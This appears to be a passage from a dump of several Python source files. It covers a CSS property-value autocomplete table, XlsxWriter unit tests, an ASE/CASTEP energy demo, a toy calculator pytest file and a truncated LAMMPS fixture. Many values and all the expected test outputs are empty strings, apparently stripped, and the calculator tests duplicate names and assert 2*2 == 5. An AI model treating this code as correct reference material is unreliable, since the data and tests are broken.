\"column-reverse\",\n            \"nowrap\",\n            \"wrap\",\n            \"wrap-reverse\",\n        ],\n        \"flex-grow\": [\n            \"\",\n        ],\n        \"flex-shrink\": [\n            \"\",\n        ],\n        \"flex-wrap\": [\"nowrap\", \"wrap\", \"wrap-reverse\"],\n        \"float\": [\n            \"left\",\n            \"right\",\n            \"none\",\n            \"inline-start\",\n            \"inline-end\",\n        ],\n        \"flood-color\": [\"\"],\n        \"flood-opacity\": [\n            \"\",\n        ],\n        \"font\": [\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n            \"caption\",\n            \"icon\",\n            \"italic\",\n            \"menu\",\n            \"message-box\",\n            \"oblique\",\n            \"small-caps\",\n            \"small-caption\",\n            \"status-bar\",\n        ],\n        \"font-display\": [\"auto\", \"block\", \"fallback\", \"optional\", \"swap\"],\n        \"font-family\": [\"\"],\n        \"font-feature-settings\": [\"normal\", \"\"],\n        \"font-kerning\": [\"auto\", \"normal\", \"none\"],\n        \"font-language-override\": [\"normal\", \"\"],\n        \"font-optical-sizing\": [\"auto\", \"none\"],\n        \"font-size\": [\n            \"\",\n            \"\",\n            \"\",\n        ],\n        \"font-size-adjust\": [\n            \"\",\n            \"none\",\n        ],\n        \"font-smooth\": [\"always\", \"auto\", \"never\"],\n        \"font-stretch\": [\n            \"normal\",\n            \"semi-condensed\",\n            \"condensed\",\n            \"extra-condensed\",\n            \"ultra-condensed\",\n            \"semi-expanded\",\n            \"expanded\",\n            \"extra-expanded\",\n            \"ultra-expanded\",\n        ],\n        \"font-style\": [\"normal\", \"italic\", \"oblique\"],\n        \"font-synthesis\": [\"none\", \"weight\", \"style\"],\n        \"font-variant\": [\"normal\", \"small-caps\"],\n        \"font-variant-alternates\": [\"\"],\n        \"font-variant-caps\": [\n            \"normal\",\n            \"small-caps\",\n            \"all-small-caps\",\n            \"petite-caps\",\n            \"all-petite-caps\",\n            \"unicase\",\n            \"titling-case\",\n        ],\n        \"font-variant-east-asian\": [\n            \"normal\",\n            \"ruby\",\n            \"jis78\",\n            \"jis83\",\n            \"jis90\",\n            \"jis04\",\n            \"simplified\",\n            \"traditional\",\n        ],\n        \"font-variant-ligatures\": [\n            \"normal\",\n            \"none\",\n            \"common-ligatures\",\n            \"no-common-ligatures\",\n            \"discretionary-ligatures\",\n            \"no-discretionary-ligatures\",\n            \"historical-ligatures\",\n            \"no-historical-ligatures\",\n            \"contextual\",\n            \"no-contextual\",\n        ],\n        \"font-variant-numeric\": [\n            \"normal\",\n            \"ordinal\",\n            \"slashed-zero\",\n            \"lining-nums\",\n            \"oldstyle-nums\",\n            \"proportional-nums\",\n            \"tabular-nums\",\n            \"diagonal-fractions\",\n            \"stacked-fractions\",\n        ],\n        \"font-variant-position\": [\"normal\", \"sub\", \"super\"],\n        \"font-variation-settings\": [\"normal\"],\n        \"font-weight\": [\"\", \"\"],\n        \"forced-color-adjust\": [\"auto\", \"none\"],\n        \"gap\": [\n            \"\",\n        ],\n        \"glyph-orientation-horizontal\": [\"auto\"],\n        \"glyph-orientation-vertical\": [\"auto\"],\n        \"grid\": [\n            \"\",\n            \"\",\n            \"auto\",\n            \"auto-flow\",\n            \"dense\",\n            \"span\",\n        ],\n        \"grid-area\": [\n            \"\",\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-auto-columns\": [\n            \"\",\n            \"\",\n            \"auto\",\n        ],\n        \"grid-auto-flow\": [\"row\", \"column\", \"dense\"],\n        \"grid-auto-rows\": [\n            \"\",\n            \"\",\n            \"auto\",\n        ],\n        \"grid-column\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-column-end\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-column-gap\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-column-start\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-gap\": [\n            \"\",\n        ],\n        \"grid-row\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-row-end\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-row-gap\": [\n            \"\",\n        ],\n        \"grid-row-start\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-template\": [\n            \"\",\n            \"\",\n            \"auto\",\n            \"max-content\",\n            \"min-content\",\n            \"none\",\n            \"subgrid\",\n        ],\n        \"grid-template-areas\": [\n            \"auto\",\n            \"\",\n            \"\",\n        ],\n        \"grid-template-columns\": [\n            \"auto\",\n            \"\",\n            \"\",\n        ],\n        \"grid-template-rows\": [\n            \"auto\",\n            \"\",\n            \"\",\n        ],\n        \"hanging-punctuation\": [\"allow-end\", \"first\", \"force-end\", \"last\", \"none\"],\n        \"height\": [\"\", \"auto\", \"fit-content\"],\n        \"hyphens\": [\"none\", \"manual\", \"auto\"],\n        \"image-orientation\": [\"flip\", \"from-image\"],\n        \"image-rendering\": [\"auto\", \"optimizeSpeed\", \"optimizeQuality\", \"pixelated\"],\n        \"image-resolution\": [\"from-image\"],\n        \"ime-mode\": [\"auto\", \"normal\", \"active\", \"inactive\", \"disabled\"],\n        \"inherits\": [\"false\", \"true\"],\n        \"initial-letter\": [\"normal\"],\n        \"initial-letter-align\": [\"alphabetic\", \"auto\", \"hanging\", \"ideographic\"],\n        \"initial-value\": [\n            \"\",\n        ],\n        \"inline-size\": [\"\", \"auto\"],\n        \"inset\": [],\n        \"inset-block\": [],\n        \"inset-block-end\": [],\n        \"inset-block-start\": [],\n        \"inset-inline\": [],\n        \"inset-inline-end\": [],\n        \"inset-inline-start\": [],\n        \"isolation\": [\"auto\", \"isolation\"],\n        \"justify-content\": [\"\"],\n        \"justify-items\": [\"\"],\n        \"justify-self\": [],\n        \"justify-tracks\": [\"left\", \"normal\", \"right\"],\n        \"kerning\": [\"\", \"auto\"],\n        \"left\": [\"\", \"auto\"],\n        \"letter-spacing\": [\n            \"\",\n            \"normal\",\n        ],\n        \"lighting-color\": [\"\"],\n        \"line-break\": [\"anywhere\", \"auto\", \"loose\", \"normal\", \"strict\"],\n        \"line-clamp\": [\"\", \"none\"],\n        \"line-height\": [\n            \"\",\n            \"normal\",\n        ],\n        \"line-height-step\": [\n            \"\",\n        ],\n        \"list-style\": [\n            \"\",\n            \"\" \"inside\",\n            \"outside\",\n        ],\n        \"list-style-image\": [\"\", \"none\"],\n        \"list-style-position\": [\"inside\", \"outside\"],\n        \"list-style-type\": [\"\"],\n        \"margin\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-block\": [\n            \"\",\n        ],\n        \"margin-block-end\": [\"\", \"auto\"],\n        \"margin-block-start\": [\"\", \"auto\"],\n        \"margin-bottom\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-inline\": [\n            \"\",\n        ],\n        \"margin-inline-end\": [\"\", \"auto\"],\n        \"margin-inline-start\": [\"\", \"auto\"],\n        \"margin-left\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-right\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-top\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-trim\": [\"all\", \"in-flow\", \"none\"],\n        \"marker\": [\"\", \"none\"],\n        \"marker-end\": [\"\", \"none\"],\n        \"marker-mid\": [\"\", \"none\"],\n        \"marker-start\": [\"\", \"none\"],\n        \"marks\": [\"crop\", \"cross\", \"none\"],\n        \"mask\": [\"\", \"\", \"none\"],\n        \"mask-border\": [\n            \"\",\n        ],\n        \"mask-border-mode\": [\"alpha\", \"luminance\"],\n        \"mask-border-outset\": [],\n        \"mask-border-repeat\": [\"repeat\", \"round\", \"space\", \"stretch\"],\n        \"mask-border-slice\": [],\n        \"mask-border-source\": [\"none\"],\n        \"mask-border-width\": [\"\", \"auto\"],\n        \"mask-clip\": [\"no-clip\"],\n        \"mask-composite\": [],\n        \"mask-image\": [\"\", \"none\"],\n        \"mask-mode\": [\"alpha\", \"auto\", \"luminance\"],\n        \"mask-origin\": [\n            \"\",\n        ],\n        \"mask-position\": [\n            \"\",\n        ],\n        \"mask-repeat\": [\"\"],\n        \"mask-size\": [\"\", \"auto\", \"contain\", \"cover\"],\n        \"mask-type\": [\"luminance\", \"alpha\"],\n        \"masonry-auto-flow\": [\"definite-first\", \"next\", \"ordered\", \"pack\"],\n        \"math-style\": [\"compact\", \"normal\"],\n        \"max-block-size\": [\"\", \"none\"],\n        \"max-height\": [\"\", \"fit-content\", \"none\"],\n        \"max-inline-size\": [\"\", \"none\"],\n        \"max-lines\": [\"\", \"none\"],\n        \"max-width\": [\"\", \"fit-content\", \"none\"],\n        \"max-zoom\": [\"\", \"auto\"],\n        \"min-block-size\": [\n            \"\",\n        ],\n        \"min-height\": [\"\", \"fit-content\"],\n        \"min-inline-size\": [\n            \"\",\n        ],\n        \"min-width\": [\"\", \"fit-content\"],\n        \"min-zoom\": [\"\", \"auto\"],\n        \"mix-blend-mode\": [\"\"],\n        \"motion\": [[\"path()\", \"path($1)\"], \"auto\", \"none\", \"reverse\"],\n        \"motion-offset\": [\n            \"\",\n        ],\n        \"motion-path\": [[\"path()\", \"path($1)\"], \"none\"],\n        \"motion-rotation\": [\"auto\", \"reverse\"],\n        \"nav-down\": [\"auto\", \"current\", \"root\"],\n        \"nav-index\": [\"auto\"],\n        \"nav-left\": [\"auto\", \"current\", \"root\"],\n        \"nav-right\": [\"auto\", \"current\", \"root\"],\n        \"nav-up\": [\"auto\", \"current\", \"root\"],\n        \"negative\": [],\n        \"object-fit\": [\"fill\", \"contain\", \"cover\", \"none\", \"scale-down\"],\n        \"object-position\": [\"\", \"\"],\n        \"offset\": [\n            \"\",\n        ],\n        \"offset-anchor\": [\"\", \"auto\"],\n        \"offset-block-end\": [\"\", \"auto\"],\n        \"offset-block-start\": [\"\", \"auto\"],\n        \"offset-distance\": [\n            \"\",\n        ],\n        \"offset-inline-end\": [\"\", \"auto\"],\n        \"offset-inline-start\": [\"\", \"auto\"],\n        \"offset-path\": [\"\", \"none\"],\n        \"offset-position\": [\"\", \"auto\"],\n        \"offset-rotate\": [\"\", \"auto\", \"reverse\"],\n        \"opacity\": [\n            \"\",\n        ],\n        \"order\": [],\n        \"orientation\": [\"auto\", \"landscape\", \"portrait\"],\n        \"orphans\": [],\n        \"outline\": [\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n        ],\n        \"outline-color\": [\"\", \"invert\"],\n        \"outline-offset\": [\"\"],\n        \"outline-style\": [\"\"],\n        \"outline-width\": [\n            \"\",\n            \"\",\n        ],\n        \"overflow\": [\"visible\", \"hidden\", \"scroll\", \"auto\"],\n        \"overflow-anchor\": [\"auto\", \"none\"],\n        \"overflow-block\": [\"auto\", \"clip\", \"hidden\", \"scroll\", \"visible\"],\n        \"overflow-clip-box\": [\"content-box\", \"padding-box\"],\n        \"overflow-inline\": [\"auto\", \"clip\", \"hidden\", \"scroll\", \"visible\"],\n        \"overflow-wrap\": [\"normal\", \"break-word\"],\n        \"overflow-x\": [\"visible\", \"hidden\", \"scroll\", \"auto\"],\n        \"overflow-y\": [\"visible\", \"hidden\", \"scroll\", \"auto\"],\n        \"overscroll-behavior\": [\"auto\", \"contain\", \"none\"],\n        \"overscroll-behavior-block\": [\"auto\", \"contain\", \"none\"],\n        \"overscroll-behavior-inline\": [\"auto\", \"contain\", \"none\"],\n        \"overscroll-behavior-x\": [\"auto\", \"contain\", \"none\"],\n        \"overscroll-behavior-y\": [\"auto\", \"contain\", \"none\"],\n        \"pad\": [\n            \"\",\n        ],\n        \"padding\": [\"\", \"auto\"],\n        \"padding-block\": [\n            \"\",\n        ],\n        \"padding-block-end\": [\n            \"\",\n        ],\n        \"padding-block-start\": [\n            \"\",\n        ],\n        \"padding-bottom\": [\"\", \"auto\"],\n        \"padding-inline\": [\n            \"\",\n        ],\n        \"padding-inline-end\": [\n            \"\",\n        ],\n        \"padding-inline-start\": [\n            \"\",\n        ],\n        \"padding-left\": [\"\", \"auto\"],\n        \"padding-right\": [\"\", \"auto\"],\n        \"padding-top\": [\"\", \"auto\"],\n        \"page-break-after\": [\"auto\", \"always\", \"avoid\", \"left\", \"right\"],\n        \"page-break-before\": [\"auto\", \"always\", \"avoid\", \"left\", \"right\"],\n        \"page-break-inside\": [\"avoid\", \"auto\"],\n        \"paint-order\": [\"normal\", \"fill\", \"stroke\", \"markers\"],\n        \"perspective\": [\"none\"],\n        \"perspective-origin\": [\"\", \"\"],\n        \"place-content\": [],\n        \"place-items\": [],\n        \"place-self\": [],\n        \"pointer-events\": [\n            \"auto\",\n            \"none\",\n            \"all\",\n            \"visiblePainted\",\n            \"visibleFill\",\n            \"visibleStroke\",\n            \"visible\",\n            \"painted\",\n            \"fill\",\n            \"stroke\",\n        ],\n        \"position\": [\"static\", \"relative\", \"absolute\", \"fixed\", \"sticky\"],\n        \"prefix\": [],\n        \"print-color-adjust\": [\"economy\", \"exact\"],\n        \"quotes\": [\"none\", \"\"],\n        \"range\": [\"auto\", \"infinite\"],\n        \"resize\": [\"none\", \"both\", \"horizontal\", \"vertical\"],\n        \"right\": [\"\", \"auto\"],\n        \"rotate\": [\"\", \"none\"],\n        \"row-gap\": [\"\", \"normal\"],\n        \"ruby-align\": [\n            \"auto\",\n            \"center\",\n            \"distribute-letter\",\n            \"distribute-space\",\n            \"left\",\n            \"line-edge\",\n            \"right\",\n            \"space-around\",\n            \"space-between\",\n            \"start\",\n        ],\n        \"ruby-merge\": [\"auto\", \"collapse\", \"separate\"],\n        \"ruby-overhang\": [\"auto\", \"end\", \"none\", \"start\"],\n        \"ruby-position\": [\n            \"after\",\n            \"before\",\n            \"inline\",\n            \"inter-character\",\n            \"over\",\n            \"right\",\n            \"under\",\n        ],\n        \"ruby-span\": [[\"attr()\", \"attr($1)\"], \"\", \"none\"],\n        \"scale\": [\"\", \"none\"],\n        \"scroll-behavior\": [\"auto\", \"smooth\"],\n        \"scroll-margin\": [\"\"],\n        \"scroll-margin-block\": [\"\"],\n        \"scroll-margin-block-end\": [\"\"],\n        \"scroll-margin-block-start\": [\"\"],\n        \"scroll-margin-bottom\": [\"\"],\n        \"scroll-margin-inline\": [\"\"],\n        \"scroll-margin-inline-end\": [\"\"],\n        \"scroll-margin-inline-start\": [\"\"],\n        \"scroll-margin-left\": [\"\"],\n        \"scroll-margin-right\": [\"\"],\n        \"scroll-margin-top\": [\"\"],\n        \"scroll-padding\": [\"auto\", \"\"],\n        \"scroll-padding-block\": [\"auto\", \"\"],\n        \"scroll-padding-block-end\": [\"auto\", \"\"],\n        \"scroll-padding-block-start\": [\"auto\", \"\"],\n        \"scroll-padding-bottom\": [\"auto\", \"\"],\n        \"scroll-padding-inline\": [\"auto\", \"\"],\n        \"scroll-padding-inline-end\": [\"auto\", \"\"],\n        \"scroll-padding-inline-start\": [\"auto\", \"\"],\n        \"scroll-padding-left\": [\"auto\", \"\"],\n        \"scroll-padding-right\": [\"auto\", \"\"],\n        \"scroll-padding-top\": [\"auto\", \"\"],\n        \"scroll-snap-align\": [\"center\", \"end\", \"none\", \"start\"],\n        \"scroll-snap-coordinate\": [\"none\"],\n        \"scroll-snap-destination\": [],\n        \"scroll-snap-points-x\": [[\"repeat()\", \"repeat($1)\"], \"none\"],\n        \"scroll-snap-points-y\": [[\"repeat()\", \"repeat($1)\"], \"none\"],\n        \"scroll-snap-stop\": [\"always\", \"normal\"],\n        \"scroll-snap-type\": [\n            \"block\",\n            \"both\",\n            \"inline\",\n            \"mandatory\",\n            \"none\",\n            \"proximity\",\n        ],\n        \"scroll-snap-type-x\": [\"mandatory\", \"none\", \"proximity\"],\n        \"scroll-snap-type-y\": [\"mandatory\", \"none\", \"proximity\"],\n        \"scrollbar-3dlight-color\": [\"\"],\n        \"scrollbar-arrow-color\": [\"\"],\n        \"scrollbar-base-color\": [\"\"],\n        \"scrollbar-color\": [\"auto\", \"dark\", \"light\", \"\"],\n        \"scrollbar-darkshadow-color\": [\"\"],\n        \"scrollbar-face-color\": [\"\"],\n        \"scrollbar-gutter\": [\"always\", \"auto\", \"stable\"],\n        \"scrollbar-highlight-color\": [\"\"],\n        \"scrollbar-shadow-color\": [\"\"],\n        \"scrollbar-track-color\": [\"\"],\n        \"scrollbar-width\": [\"auto\", \"none\", \"thin\", \"\"],\n        \"shape-image-threshold\": [],\n        \"shape-margin\": [\"\"],\n        \"shape-outside\": [\n            \"none\",\n            \"margin-box\",\n            \"content-box\",\n            \"border-box\",\n            \"padding-box\",\n            \"\",\n            \"\",\n        ],\n        \"shape-rendering\": [\n            \"auto\",\n            \"optimizeSpeed\",\n            \"crispEdges\",\n            \"geometricPrecision\",\n        ],\n        \"size\": [\n            \"a3\",\n            \"a4\",\n            \"a5\",\n            \"b4\",\n            \"b5\",\n            \"jis-b4\",\n            \"jis-b5\",\n            \"landscape\",\n            \"ledger\",\n            \"legal\",\n            \"letter\",\n            \"portrait\",\n        ],\n        \"speak-as\": [\"auto\", \"bullets\", \"numbers\", \"spell-out\", \"words\"],\n        \"src\": [[\"format()\", \"format($1)\"], [\"local()\", \"local($1)\"], \"\"],\n        \"stop-color\": [\"\"],\n        \"stop-opacity\": [\"\"],\n        \"stroke\": [\"\", \"\"],\n        \"stroke-dasharray\": [\"none\"],\n        \"stroke-dashoffset\": [],\n        \"stroke-linecap\": [\"butt\", \"round\", \"square\"],\n        \"stroke-linejoin\": [\"round\", \"miter\", \"bevel\"],\n        \"stroke-miterlimit\": [\"\"],\n        \"stroke-opacity\": [\"\"],\n        \"stroke-width\": [\"\"],\n        \"suffix\": [],\n        \"symbols\": [],\n        \"syntax\": [],\n        \"system\": [\"\"],\n        \"tab-size\": [\"\"],\n        \"table-layout\": [\"auto\", \"fixed\"],\n        \"text-align\": [\"left\", \"right\", \"center\", \"justify\", \"justify-all\"],\n        \"text-align-last\": [\"start\", \"end\", \"left\", \"right\", \"center\", \"justify\"],\n        \"text-anchor\": [\"start\", \"middle\", \"end\"],\n        \"text-combine-upright\": [\"all\", \"digits\", \"none\"],\n        \"text-decoration\": [\"none\", \"underline\", \"overline\", \"line-through\", \"blink\"],\n        \"text-decoration-color\": [\"\"],\n        \"text-decoration-line\": [\"none\", \"underline\", \"overline\", \"line-through\"],\n        \"text-decoration-skip\": [\n            \"box-decoration\",\n            \"edges\",\n            \"leading-spaces\",\n            \"none\",\n            \"objects\",\n            \"spaces\",\n            \"trailing-spaces\",\n        ],\n        \"text-decoration-skip-ink\": [\"all\", \"auto\", \"none\"],\n        \"text-decoration-style\": [\"solid\", \"double\", \"dotted\", \"dashed\", \"wavy\"],\n        \"text-decoration-thickness\": [\"auto\", \"from-font\"],\n        \"text-emphasis\": [\n            \"\",\n            \"\",\n            \"\",\n        ],\n        \"text-emphasis-color\": [\n            \"\",\n        ],\n        \"text-emphasis-position\": [\"left\", \"over\", \"right\", \"under\"],\n        \"text-emphasis-style\": [\"\", \"\"],\n        \"text-indent\": [\"\", \"hanging\", \"each-line\"],\n        \"text-justify\": [\n            \"auto\",\n            \"distribute\",\n            \"distribute-all-lines\",\n            \"inter-character\",\n            \"inter-cluster\",\n            \"inter-ideograph\",\n            \"inter-word\",\n            \"kashida\",\n            \"newspaper\",\n            \"none\",\n        ],\n        \"text-orientation\": [\"mixed\", \"upright\", \"sideways\", \"use-glyph-orientation\"],\n        \"text-overflow\": [\"\", \"clip\", \"ellipsis\"],\n        \"text-rendering\": [\n            \"auto\",\n            \"optimizeSpeed\",\n            \"optimizeLegibility\",\n            \"geometricPrecision\",\n        ],\n        \"text-shadow\": [\"\", \"none\"],\n        \"text-size-adjust\": [\"\", \"auto\", \"none\"],\n        \"text-transform\": [\n            \"capitalize\",\n            \"full-size-kana\",\n            \"full-width\",\n            \"uppercase\",\n            \"lowercase\",\n            \"none\",\n        ],\n        \"text-underline-offset\": [\"\", \"auto\"],\n        \"text-underline-position\": [\"auto\", \"under\", \"left\", \"right\"],\n        \"top\": [\"\", \"auto\"],\n        \"touch-action\": [\n            \"auto\",\n            \"cross-slide-x\",\n            \"cross-slide-y\",\n            \"double-tap-zoom\",\n            \"manipulation\",\n            \"none\",\n            \"pan-down\",\n            \"pan-left\",\n            \"pan-right\",\n            \"pan-up\",\n            \"pan-x\",\n            \"pan-y\",\n            \"pinch-zoom\",\n        ],\n        \"transform\": [\n            \"none\",\n            [\"matrix()\", \"matrix(${1:1}, ${2:1}, ${3:1}, ${4:1}, ${5:2}, ${6:2})\"],\n            [\n                \"matrix3d()\",\n                \"matrix3d(${1:1}, ${2:1}, ${3:0}, ${4:0}, ${5:1}, ${6:1}, ${7:0}, ${8:0}, ${9:0}, ${10:0}, ${11:1}, ${12:0}, ${13:2}, ${14:2}, ${15:0}, ${16:1})\",\n            ],\n            [\"perspective()\", \"perspective(${1:0})\"],\n            [\"rotate()\", \"rotate(${1:45deg})\"],\n            [\"rotate3d()\", \"rotate3d(${1:0}, ${2:0}, ${3:1}, ${4:45deg})\"],\n            [\"rotateX()\", \"rotateX(${1:45deg})\"],\n            [\"rotateY()\", \"rotateY(${1:45deg})\"],\n            [\"rotateZ()\", \"rotateZ(${1:45deg})\"],\n            [\"scale()\", \"scale(${1:1.0})\"],\n            [\"scale3d()\", \"scale3d(${1:1.0}, ${2:1.0}, ${3:1.0})\"],\n            [\"scaleX()\", \"scaleX(${1:1.0})\"],\n            [\"scaleY()\", \"scaleY(${1:1.0})\"],\n            [\"scaleZ()\", \"scaleZ(${1:1.0})\"],\n            [\"skew()\", \"skew(${1:10deg})\"],\n            [\"skewX()\", \"skewX(${1:10deg})\"],\n            [\"skewY()\", \"skewY(${1:10deg})\"],\n            [\"translate()\", \"translate(${1:10px})\"],\n            [\"translate3d()\", \"translate3d(${1:10px}, ${2:0px}, ${3:0px})\"],\n            [\"translateX()\", \"translateX(${1:10px})\"],\n            [\"translateY()\", \"translateY(${1:10px})\"],\n            [\"translateZ()\", \"translateZ(${1:10px})\"],\n        ],\n        \"transform-box\": [\n            \"border-box\",\n            \"content-box\",\n            \"fill-box\",\n            \"stroke-box\",\n            \"view-box\",\n        ],\n        \"transform-origin\": [\"\", \"\"],\n        \"transform-style\": [\"preserve-3d\", \"flat\"],\n        \"transition\": [\n            \"\",\n            \"\",\n            \"all\",\n            \"none\",\n        ],\n        \"transition-delay\": [\n            \"\",\n        ],\n        \"transition-duration\": [\n            \"\",\n        ],\n        \"transition-property\": [\n            \"all\",\n            \"none\",\n        ],\n        \"transition-timing-function\": [\"\", \"\"],\n        \"translate\": [\"\", \"none\"],\n        \"unicode-bidi\": [\n            \"bidi-override\" \"embed\",\n            \"isolate\",\n            \"isolate-override\",\n            \"normal\",\n            \"plaintext\",\n        ],\n        \"unicode-range\": [],\n        \"user-select\": [\"all\", \"auto\", \"text\", \"none\", \"contain\"],\n        \"user-zoom\": [\"fixed\", \"zoom\"],\n        \"vertical-align\": [\n            \"\",\n            \"baseline\",\n            \"sub\",\n            \"super\",\n            \"text-top\",\n            \"text-bottom\",\n            \"middle\",\n            \"top\",\n            \"bottom\",\n        ],\n        \"viewport-fit\": [\"auto\", \"contain\", \"cover\"],\n        \"visibility\": [\"visible\", \"hidden\", \"collapse\"],\n        \"white-space\": [\n            \"break-spaces\",\n            \"normal\",\n            \"pre\",\n            \"nowrap\",\n            \"pre-wrap\",\n            \"pre-line\",\n        ],\n        \"widows\": [\n            \"\",\n        ],\n        \"width\": [\"\", \"auto\", \"fit-content\"],\n        \"will-change\": [\n            \"auto\",\n            \"contents\",\n            \"scroll-position\",\n        ],\n        \"word-break\": [\"normal\", \"break-all\", \"break-word\", \"keep-all\"],\n        \"word-spacing\": [\n            \"\",\n            \"normal\",\n        ],\n        \"word-wrap\": [\"normal\", \"break-word\"],\n        \"writing-mode\": [\n            \"horizontal-tb\",\n            \"vertical-rl\",\n            \"vertical-lr\",\n            \"sideways-rl\",\n            \"sideways-lr\",\n        ],\n        \"z-index\": [\n            \"\",\n            \"auto\",\n        ],\n        \"zoom\": [\"\", \"auto\", \"normal\", \"reset\"],\n    }\n\n\nfor_all = [\n    'inherit',\n    'initial',\n    'revert',\n    'revert-layer',\n    'unset',\n    'var()',\n    '!important'\n    ]\n\n\n# pre-process keys which have \" | \" separators\nfor k in props.copy(): # copy() is required\n    if ' | ' in k:\n        val = props[k]\n        del props[k]\n        for kk in k.split(' | '):\n            props[kk] = val\n\n\ndef get_data(name):\n    #get list of properties\n    if not name:\n        return list(props.keys())\n\n    #get list of values for property\n    r = []\n    values = props.get(name, [])\n    for val in values:\n        if type(val) is str:\n            if val.startswith('<') and val.endswith('>'):\n                more = common_values.get(val[1:-1], [])\n                for m in more:\n                    if type(m) is str:\n                        r.append(m)\n                    elif type(m) is list:\n                        r.append(m[0])\n            else:\n                r.append(val)\n        elif type(val) is list:\n            r.append(val[0])\n    r += for_all\n    return r\n", "541": "###############################################################################\n#\n# Tests for XlsxWriter.\n#\n# Copyright (c), 2013-2015, John McNamara, jmcnamara@cpan.org\n#\n\nimport unittest\nfrom ...compatibility import StringIO\nfrom ...workbook import Workbook\n\n\nclass TestWriteCalcPr(unittest.TestCase):\n    \"\"\"\n    Test the Workbook _write_calc_pr() method.\n\n    \"\"\"\n\n    def setUp(self):\n        self.fh = StringIO()\n        self.workbook = Workbook()\n        self.workbook._set_filehandle(self.fh)\n\n    def test_write_calc_pr(self):\n        \"\"\"Test the _write_calc_pr() method.\"\"\"\n\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def test_calc_mode_auto_except_tables(self):\n        \"\"\"\n        Test the _write_calc_pr() method with the calculation mode set\n        to auto_except_tables.\n\n        \"\"\"\n\n        self.workbook.set_calc_mode(\"auto_except_tables\")\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def test_calc_mode_manual(self):\n        \"\"\"\n        Test the _write_calc_pr() method with the calculation mode set to\n        manual.\n\n        \"\"\"\n\n        self.workbook.set_calc_mode(\"manual\")\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def test_write_calc_pr(self):\n        \"\"\"Test the _write_calc_pr() method with non-default calc id.\"\"\"\n\n        self.workbook.set_calc_mode(\"auto\", 12345)\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def tearDown(self):\n        self.workbook.fileclosed = 1\n", "542": "\"\"\"This simple demo calculates the total energy of CO molecules\nusing once LDA and once PBE as xc-functional. Obviously\nsome parts in this scripts are longer than necessary, but are shown\nto demonstrate some more features.\"\"\"\n\nimport ase\nimport ase.calculators.castep, ase.io.castep\n\ncalc = ase.calculators.castep.Castep()\ndirectory = 'CASTEP_ASE_DEMO'\n\n# include interface settings in .param file\ncalc._export_settings = True\n\n# reuse the same directory\ncalc._directory = directory\ncalc._rename_existing_dir = False\ncalc._label = 'CO_LDA'\n\n# necessary for tasks with changing positions\n# such as GeometryOptimization or MolecularDynamics\ncalc._set_atoms = True\n\n# Param settings\ncalc.param.xc_functional = 'LDA'\ncalc.param.cut_off_energy = 400\n# Prevent CASTEP from writing *wvfn* files\ncalc.param.num_dump_cycles = 0\n\n# Cell settings\ncalc.cell.kpoint_mp_grid = '1 1 1'\ncalc.cell.fix_com = False\ncalc.cell.fix_all_cell = True\n\n# Set and clear and reset settings (just for shows)\ncalc.param.task = 'SinglePoint'\n# Reset to CASTEP default\ncalc.param.task.clear()\n\n# all of the following are identical\ncalc.param.task = 'GeometryOptimization'\ncalc.task = 'GeometryOptimization'\ncalc.TASK = 'GeometryOptimization'\ncalc.Task = 'GeometryOptimization'\n\n\n# Prepare atoms\nmol = ase.atoms.Atoms('CO', [[0, 0, 0], [0, 0, 1.2]], cell=[10, 10, 10])\nmol.set_calculator(calc)\n\n# Check for correct input\nif calc.dryrun_ok():\n    print('%s : %s ' % (mol.calc._label, mol.get_potential_energy()))\nelse:\n    print(\"Found error in input\")\n    print(calc._error)\n\n\n# Read all settings from previous calculation\nmol = ase.io.castep.read_seed('%s/CO_LDA' % directory)\n\n# Use the OTF pseudo-potential we have just generated\nmol.calc.set_pspot('OTF')\n\n# Change some settings\nmol.calc.param.xc_functional = 'PBE'\n# don't forget to set an appropriate label\nmol.calc._label = 'CO_PBE'\n# Recalculate the potential energy\nprint('%s : %s ' % (mol.calc._label, mol.get_potential_energy()))\n", "543": "import pytest\nfrom app.calculator import Calculator\n\n\nclass TestCalc:\n    def setup(self):\n        self.calc = Calculator\n\n    def test_multiply_calculate_correctly(self):\n        assert self.calc.multiply(self, 2, 2) == 4\n\n    def test_multiply_calculation_failed(self):\n        assert self.calc.multiply(self, 2, 2) == 5\n\n    def test_multiply_calculator_correct(self):\n        assert self.calc.divission(self, 8, 2) == 4\n\n    def test_multiply_calculator_correct(self):\n        assert self.calc.subtraction(self, 15, 5) == 10\n\n    def test_multiply_calculator_corrrct(self):\n        assert self.calc.adding(self, 5, 5) == 10\n", "544": "import pytest\n\n\n@pytest.fixture\ndef calc_params_NiH():\n    calc_params = {}\n    calc_params[\"lmpcmds\"] = [\n        \"pair_style eam/alloy\",\n        \"pair_coeff * * NiAlH_jea.eam.alloy Ni H\",\n    ]\n    calc_params[\"atom_types\"] = {\"Ni\": 1, \"H\": 2}\n    calc_params[\"log_file\"] = \"test.log\"\n    calc_params[\"keep_alive\"] = True\n    return calc_params\n\n\n@pytest.fixture\ndef dimer_params():\n    dimer_params = {}\n    a = 2.0\n    dimer_params[\"symbols\"] = \"Ni\" * 2\n    dimer_params[\"positions\"] = [(0, 0, 0), (a, 0, 0)]\n    